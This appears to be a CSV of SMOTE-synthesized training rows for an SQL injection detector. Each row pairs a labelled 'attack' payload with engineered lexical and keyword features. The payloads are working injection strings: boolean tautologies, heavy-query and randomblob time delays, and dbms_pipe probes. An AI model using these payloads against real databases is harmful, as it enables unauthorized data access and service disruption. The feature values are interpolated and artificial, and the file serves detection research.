id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000280,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000176,0.009828626364365578,73.07665591754402,26.019163979386004,3.7747326187276555,14.057491938158009,24.0,24.019163979386,11.0,0.19230910343986446,0.3284559881581166,0.3286925804962154,0.15054232790580344,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,boolean,1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,nearest_attack_euclidean,R000174,0.6171767977020175,61.75992609318675,20.56994456989007,3.353269620231769,8.569944569890062,21.0,24.0,8.189981523296687,0.13838265069805802,0.3402374658368419,0.38884281809924787,0.1325370653658522,0.18998152329668883,1.1102230246251565e-16,2.0,0.0,0.8100184767033112,2.0,0.0,3.0,0.0,0.0,0.1899815232966886,4.810018476703311,0.18998152329668866,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000224,0.8459192166222557,92.9830472361562,22.849877386924085,3.1051644834003413,18.849877386924085,13.0,46.56658492461606,14.566584924616057,0.20247185377430815,0.13996640344583644,0.5010472140924956,0.15651452868735977,0.0,4.0,0.0,0.0,0.7167075376919716,1.2832924623080284,0.0,8.0,0.0,0.2832924623080284,0.2832924623080284,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R000248,0.48849386849403004,97.91362256306621,28.234550974773512,3.4561671898172173,20.0,16.0,45.530898050452976,16.382724512613244,0.20473588823182196,0.16378871058545758,0.46423314329981197,0.1672422578829085,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,7.382724512613244,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,1.1260217612086232,151.08172040120485,32.8766713392352,4.107218478247266,74.69836370502881,16.0,44.506685356940814,15.876671339235203,0.4940248475491234,0.10649941504846577,0.294286978847918,0.10518875855449278,0.0,0.43833566961760145,2.0,0.0,1.0,2.0,0.0,5.438335669617602,0.0,0.0,2.0,5.0,0.0,0.43833566961760134,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,boolean,"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000170,0.6256937279206546,126.23771978722047,27.23771978722047,3.8818118814725344,71.23771978722047,8.713159361661411,34.52456042555906,11.76228021277953,0.5643091231281794,0.06898864649866103,0.2735142120402278,0.09318801833293183,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.7622802127795305,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.23771978722046994,0.76228021277953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",nearest_attack_euclidean,R000222,1.4255905458431994,118.89923299111743,30.579846598223487,3.845884710055564,50.0,10.0,43.319386392893946,15.579846598223487,0.4207066365377692,0.08414132730755385,0.3641479245468711,0.13100411160780587,3.2604602053295406,1.7395397946704594,0.0,1.0,0.0,0.0,0.0,8.579846598223487,0.0,0.0,1.0,1.0,1.0,0.5798465982234865,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000247,1.5322930892525695,65.93522938776138,18.93522938776139,3.2159057466127496,15.870458775522778,10.870458775522781,29.194311836715826,10.0,0.24029543260168112,0.16444609780002944,0.44355979999498607,0.15169866960330336,4.0,1.1102230246251565e-16,0.0,0.0,0.4676146938806952,1.5323853061193047,0.0,4.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000288,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",nearest_attack_euclidean,R000280,0.37934073960749776,148.78745169252525,31.212548307474755,3.50230251474638,46.14980677010099,15.0,66.42509661494951,21.212548307474755,0.3101447024848703,0.10081571851134234,0.44646143587524084,0.14257814312854653,6.0,1.1102230246251565e-16,0.0,1.0,0.0,1.2125483074747536,0.0,12.0,0.0,0.0,1.0,2.212548307474753,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,boolean,"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000267,1.4864269008428945,141.90119671245046,32.41566940629129,3.668320328023403,37.95059835622522,15.316866118741741,60.0,28.633732237483486,0.2673551610328212,0.10791796995778312,0.42299061630396145,0.20173625270543422,0.0,1.9505983562252247,1.3662677625165172,0.0,0.0,1.3168661187417416,0.0,12.683133881258259,1.3168661187417414,2.0,1.0,8.683133881258259,0.0,1.0,0.6831338812582585,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.3168661187417414,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3168661187417416
SMOTE_000290,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000070,0.25019916370167217,69.0,24.1993917133406,3.60469760918762,14.099695856670298,21.0,25.8006082866594,8.099695856670298,0.20434341821261304,0.30434782608695654,0.3739218592269479,0.11738689647348259,0.0,1.1102230246251565e-16,2.0,0.0,0.900304143329701,2.0,0.0,3.0,0.0,0.0996958566702989,0.09969585667029879,4.900304143329701,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,1.9016837876055996,152.09722803124401,34.58055439375119,4.1081923143801085,60.063880756258364,16.741663181253585,52.033347274985665,23.258336818746415,0.3953744837621669,0.1102580375322858,0.34156698381846795,0.1528004948870793,4.0,4.0,0.5805543937511947,0.0,0.0,2.0,0.0,6.838891212497611,0.8388912124976107,0.0,0.0,6.5805543937511946,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.4194456062488054,0.5805543937511947,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000292,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",nearest_attack_euclidean,R000280,0.46244202573190546,145.72915109646513,31.0,3.5029228689302268,45.77343166117443,14.318573145096902,64.77343166117443,20.86371462901938,0.3138776491801948,0.09785396682805161,0.4447311326254116,0.143537251366342,5.8637146290193805,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,11.86371462901938,0.13628537098061946,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.1362853709806195,0.0,0.0,0.0,1.8637146290193807,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000308,0.8880744459845573,74.32739292498981,20.0,3.2672758612046033,17.999999999999996,13.0,32.28062250713412,11.046770417855686,0.24435358897184145,0.17647759203521882,0.4304937335412292,0.1486750854517105,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.0467704178556865,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000294,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.102797211917079,63.63864941344597,22.319324706722984,3.468897656265473,25.361350586554035,4.0,24.95797412016895,9.319324706722982,0.39881812019616825,0.0628682301211761,0.3919474441142712,0.14636620556838442,0.0,1.361350586554034,2.0,0.0,1.0,2.0,0.0,1.3193247067229832,0.0,0.0,0.0,5.638649413445966,0.0,0.680675293277017,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.6806752932770168,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.680675293277017
SMOTE_000295,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,0.24065402010013415,105.41690199514946,32.895774501212635,3.7798397418289476,32.0,15.0,42.41690199514945,16.0,0.30359625479731045,0.14231074443623923,0.4022948733677952,0.1517981273986552,2.0,0.8957745012126365,2.0,1.0,0.0,1.0,0.0,8.104225498787363,0.0,0.0,1.0,4.0,1.0,0.8957745012126366,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000296,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000191,1.2568385183081576,75.47639529941497,23.273372073684122,3.1860837108686217,9.101511612865423,14.343720921637388,36.687441843274776,15.343720921637388,0.11611228529422798,0.19043528530332796,0.48944530259995384,0.2040071268024902,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,5.171860460818694,1.9999999999999998,0.5859302304093468,0.5859302304093469,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,boolean,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000071,0.34967328486716354,128.74411871374272,32.24647122824564,4.234556989008297,71.0,8.748823742748545,32.49764748549709,16.49764748549709,0.5516410813122625,0.06791692419283854,0.2523777388037607,0.1280642556911382,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.0,1.0,0.0,2.7488237427485456,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000298,attack,boolean,"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000081,1.0995453201728715,137.48558188525453,35.971163770509065,3.862912640380718,43.0,23.0,54.0,17.485581885254533,0.31276420072643896,0.16729247945832781,0.3927736474239001,0.12716967239133312,2.0,0.4855818852545334,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.4855818852545333,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000187,1.66116991314298,71.53153213295332,28.23900378034745,3.9641869943407095,19.4340226820847,16.0,23.71701134104235,12.380498109826275,0.26546805338623936,0.22688009371011914,0.3312541086894739,0.17639774421416762,0.0,4.0,1.0,0.0,0.0,1.3804981098262752,0.0,3.2390037803474496,0.7609962196525503,1.0,1.0,2.3804981098262754,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000300,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000224,1.7619036128131442,85.09475614867873,22.984207308553543,3.1468744450254897,17.50789634572323,12.507896345723228,42.06317076578582,13.015792691446455,0.20635873651197614,0.14730654298622758,0.4934468989911376,0.1528878215106587,0.0,4.0,0.49210365427677244,0.0,0.5078963457232276,1.0,0.0,7.015792691446455,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5078963457232277,0.4921036542767724,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000301,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   7700  =  7700",nearest_attack_euclidean,R000254,0.17651255943306582,125.7863783087589,28.0,3.942074567934218,70.78637830875891,10.47987641803953,33.34674905464031,11.173374527320156,0.5625492655499829,0.0831557837069995,0.26536001612534615,0.0889349346176714,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.173374527320156,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000302,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000302,0.014289804906863575,87.89546062432865,27.01493419652448,3.809007952616383,20.0,24.0,31.91039482085313,11.985065803475521,0.22756604763095215,0.27307925715714254,0.3629994394299325,0.13635525578197277,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.985065803475522,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000303,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000138,0.17290723900409075,152.07736831172292,34.66071205500993,4.3025956557190135,75.2083281283565,16.886904018336644,42.32142411001986,17.66071205500993,0.4946536420549795,0.11111327886645905,0.27818620132424743,0.11604687775431398,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.886904018336644,0.0,0.0,2.8869040183366437,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000304,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,nearest_attack_euclidean,R000132,1.6143982843184381,140.42211038752356,26.7185930749843,3.188839210158978,37.4371861499686,17.562813850031397,70.56281385003139,14.85929653749215,0.2673250914332964,0.12452749029740671,0.5021308872379024,0.10601653103139441,1.7185930749843017,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,11.14070346250785,0.0,0.0,0.0,2.0,0.4296482687460754,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000305,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,0.5173677051639253,164.7947905397646,34.589581079529175,4.067051347257227,82.79479053976459,16.0,49.0,17.0,0.5024084561811049,0.09709103294027224,0.29734128837958373,0.10315922249903925,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.7947905397645867,0.20520946023541328,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000306,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,1.1150635427021593,164.557719615194,34.115439230388,4.057561898152852,82.557719615194,16.0,49.0,17.0,0.5016900594399818,0.09723120791414988,0.29777057423708403,0.10330815840878425,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5577196151939996,0.44228038480600046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000307,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000247,0.1680395618636729,65.1713163100295,18.171316310029496,3.04898902158029,13.942894563323499,9.171316310029496,32.0,10.0571054366765,0.21400219870489018,0.1406320618465276,0.4910673932305557,0.1542983462180266,4.0,1.1102230246251565e-16,0.05710543667649959,0.0,0.0,2.0,0.0,4.0,0.0,0.0,0.0,2.0571054366764994,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9428945633235006,0.05710543667649948,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000308,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000073,1.1959952532424625,149.87820175332166,33.526099624288214,4.157506556137442,76.38690162808442,16.0,41.982600250474526,15.508699874762737,0.5087458380510246,0.106986271076872,0.2804109199559783,0.10385697091612511,0.5086998747627374,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.5086998747627375,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000309,attack,boolean,"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""kbex"" like ""kbex",nearest_attack_euclidean,R000143,0.42021250728996934,145.30741096428048,32.715954689560036,4.335113336915091,85.14786406868012,8.289886723900093,35.29572813736022,16.573932034340054,0.5875808590224922,0.05644275785358156,0.24192117022907705,0.11405521289484913,0.0,3.8579773447800187,0.0,0.0,1.0,1.0,0.0,3.715954689560037,0.0,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.8579773447800185,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8579773447800187
